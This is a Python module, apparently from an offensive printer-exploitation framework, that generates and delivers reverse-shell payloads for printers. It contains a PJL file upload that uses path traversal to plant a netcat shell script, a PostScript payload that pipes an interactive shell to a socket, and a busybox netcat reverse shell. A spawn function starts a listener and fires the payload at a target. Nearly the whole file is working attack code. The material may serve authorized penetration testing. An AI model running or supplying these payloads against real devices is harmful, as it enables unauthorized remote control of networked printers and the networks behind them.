"""Printer-specific shell staging mixin.

Extends xpl-core shell infrastructure with printer/PJL payloads:
firmware inject, PJL filesystem upload, PostScript reverse.

Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""

from __future__ import annotations

import threading
import time
from typing import Any, Optional

from xpl_core.shells import (
    SessionManager,
    ReverseListener,
    generate_payload,
)

_session_mgr = SessionManager()

PRINTER_SHELL_TYPES = (
    "busybox_nc",
    "mkfifo",
    "python",
    "pjl_upload_exec",
    "postscript_reverse",
)


def _printer_payload(shell_type: str, lhost: str, lport: int) -> str:
    """Generate printer-specific payloads."""
    t = shell_type.lower().strip()

    if t == "pjl_upload_exec":
        return (
            "@PJL FSUPLOAD FORMAT:BINARY NAME=\"0:/../../tmp/shell.sh\" "
            "OFFSET=0 SIZE=4096\r\n"
            "#!/bin/sh\n"
            "nc {} {} -e /bin/sh &\r\n"
            "@PJL FSDOWNLOAD FORMAT:BINARY NAME=\"0:/../../tmp/shell.sh\" "
            "OFFSET=0 SIZE=4096\r\n"
            "@PJL FSDIRLIST NAME=\"0:/../../tmp/\" ENTRY=1 COUNT=65535\r\n"
        ).format(lhost, lport)

    if t == "postscript_reverse":
        return (
            "%!PS\n"
            "({lh}) ({lp}) .setsocket\n"
            "(%pipe%/bin/sh -i) (r) file\n"
        ).format(lh=lhost, lp=lport)

    if t == "busybox_nc":
        return "busybox nc {} {} -e /bin/sh".format(lhost, lport)

    return generate_payload(t, lhost, lport)


def get_session_manager() -> SessionManager:
    return _session_mgr


def spawn_printer_shell(
    target: str,
    lhost: str,
    lport: int = 4444,
    shell_type: str = "busybox_nc",
    execute_fn: Optional[Any] = None,
    timeout: int = 60,
) -> bool:
    """Spawn a reverse shell from a printer exploit."""
    payload = _printer_payload(shell_type, lhost, lport)
    if not payload:
        print("[-] [printer-shell] Unknown shell type: '{}'".format(shell_type))
        return False

    print("[*] [printer-shell] Payload: {}".format(shell_type))
    print("[*] [printer-shell] Listener: {}:{}".format(lhost, lport))

    with ReverseListener(lhost, lport, timeout, pty_upgrade=True) as ln:
        if execute_fn is not None:
            def _exec() -> None:
                time.sleep(1)
                try:
                    execute_fn(payload)
                except Exception as exc:
                    print("[-] [printer-shell] Execute: {}".format(exc))

            t = threading.Thread(target=_exec, daemon=True)
            t.start()

        return ln.wait_for_connection()
